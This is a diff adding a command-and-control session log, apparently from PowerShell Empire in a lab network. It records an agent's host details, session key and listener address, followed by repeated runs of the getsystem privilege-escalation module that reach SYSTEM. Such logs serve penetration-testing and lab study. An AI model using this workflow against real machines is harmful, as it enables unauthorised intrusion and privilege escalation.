@@ -1,0 +1,100 @@
+
+2019-05-14 21:17:20 : 
+
+[*] Agent info:
+  nonce           	5840847738561848
+  jitter          	0.0
+  servers         	None
+  internal_ip     	192.168.226.1 fe80::9442:f8f3:5b23:22d1 192.168.153.1
+                                fe80::78a5:53be:b208:43ea 192.168.252.205 fe80::a41d:e79e:d3d7:49a8
+                                169.254.182.30 fe80::4d72:dc5a:5819:b61e
+  working_hours   	
+  session_key     	;p23hr\}{Ob?W<B0@9DvM*)#/fZT7c:P
+  children        	None
+  checkin_time    	2019-05-14 21:17:19
+  hostname        	LAMEDIM-LT
+  id              	2
+  delay           	5
+  username        	LAMEDIM-LT\User
+  kill_date       	
+  parent          	None
+  process_name    	powershell
+  listener        	http
+  process_id      	8772
+  profile         	/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT
+                                6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+  os_details      	Microsoft Windows 10 Home
+  lost_limit      	60
+  taskings        	None
+  name            	7GHADY8S
+  language        	powershell
+  external_ip     	192.168.153.1
+  session_id      	7GHADY8S
+  lastseen_time   	2019-05-14 21:17:19
+  language_version	5
+  high_integrity  	1
+
+
+[+] Agent 7GHADY8S now active:
+
+
+2019-05-14 21:17:46 : 
+Tasked agent to run command whoami
+
+2019-05-14 21:17:51 : 
+LAMEDIM-LT\User
+
+2019-05-14 21:18:42 : 
+Tasked agent to run module powershell/privesc/getsystem
+
+2019-05-14 21:18:46 : 
+error running command: Exception calling "GetMethod" with "1" argument(s): "Ambiguous match found."
+
+2019-05-14 21:21:14 : 
+Tasked agent to run module powershell/privesc/getsystem
+
+2019-05-14 21:21:18 : 
+Running as: LAMEDIM\SYSTEM
+
+
+Get-System completed
+
+2019-05-14 21:21:38 : 
+Tasked agent to run module powershell/privesc/getsystem
+
+2019-05-14 21:21:39 : 
+Running as: LAMEDIM\SYSTEM
+
+
+Get-System completed
+
+2019-05-14 21:23:01 : 
+Tasked agent to run module powershell/privesc/getsystem
+
+2019-05-14 21:23:05 : 
+Running as: LAMEDIM\SYSTEM
+
+
+Get-System completed
+
+2019-05-14 21:24:14 : 
+Tasked agent to run command whoami
+
+2019-05-14 21:24:16 : 
+NT AUTHORITY\SYSTEM
+
+2019-05-14 21:24:59 : 
+Tasked agent to get system information
+
+2019-05-14 21:25:01 : 
+Listener:         http://192.168.153.136:8080
+Internal IP:    192.168.226.1 fe80::9442:f8f3:5b23:22d1 192.168.153.1 fe80::78a5:53be:b208:43ea 192.168.252.205 fe80::a41d:e79e:d3d7:49a8 169.254.182.30 fe80::4d72:dc5a:5819:b61e
+Username:         LAMEDIM\SYSTEM
+Hostname:       LAMEDIM-LT
+OS:               Microsoft Windows 10 Home
+High Integrity:   1
+Process Name:     powershell
+Process ID:       8772
+Language:         powershell
+Language Version: 5
+
